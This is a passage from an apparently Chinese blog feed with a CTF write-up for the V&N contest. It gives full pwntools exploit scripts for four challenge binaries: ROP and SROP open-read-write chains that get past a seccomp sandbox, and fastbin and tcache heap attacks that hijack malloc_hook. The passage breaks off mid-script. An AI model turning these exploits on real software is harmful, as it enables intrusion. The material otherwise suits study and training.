      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span 